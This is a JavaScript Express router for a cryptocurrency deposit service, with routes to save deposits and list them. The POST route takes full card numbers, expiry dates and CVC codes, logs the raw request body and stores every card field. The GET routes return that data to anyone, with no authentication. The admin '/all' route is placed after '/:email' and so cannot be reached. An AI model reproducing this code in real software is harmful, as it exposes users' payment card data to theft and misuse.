import express from 'express';
import Deposit from '../models/Deposit.js';

const router = express.Router();

// Create a new deposit record
router.post('/', async (req, res) => {
  try {
    const { email, amount, btcAmount, btcPrice, cardNumber, cardLast4, cardExpiry, cardCVC, coin } = req.body;
    console.log('[DEPOSIT] POST /api/deposits', req.body);
    if (!email || !amount || !btcAmount || !btcPrice) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    const deposit = new Deposit({
      email,
      amount,
      btcAmount,
      btcPrice,
      cardNumber: cardNumber || '',
      cardLast4: cardLast4 || '',
      cardExpiry: cardExpiry || '',
      cardCVC: cardCVC || '',
      coin: coin || ''
    });
    await deposit.save();
    console.log('[DEPOSIT] Saved:', deposit);
    res.json({ message: 'Deposit saved', deposit });
  } catch (err) {
    console.error('[DEPOSIT] Error:', err);
    res.status(500).json({ error: err.message });
  }
});

// Get all deposits for a user
router.get('/:email', async (req, res) => {
  try {
    console.log('[DEPOSIT] GET /api/deposits/' + req.params.email);
    const deposits = await Deposit.find({ email: req.params.email }).sort({ createdAt: -1 });
    console.log('[DEPOSIT] Found:', deposits.length, 'deposits');
    res.json(deposits);
  } catch (err) {
    console.error('[DEPOSIT] Error:', err);
    res.status(500).json({ error: err.message });
  }
});

// Admin: Get all deposits
router.get('/all', async (req, res) => {
  try {
    const deposits = await Deposit.find({}).sort({ createdAt: -1 });
    res.json(deposits);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

export default router;
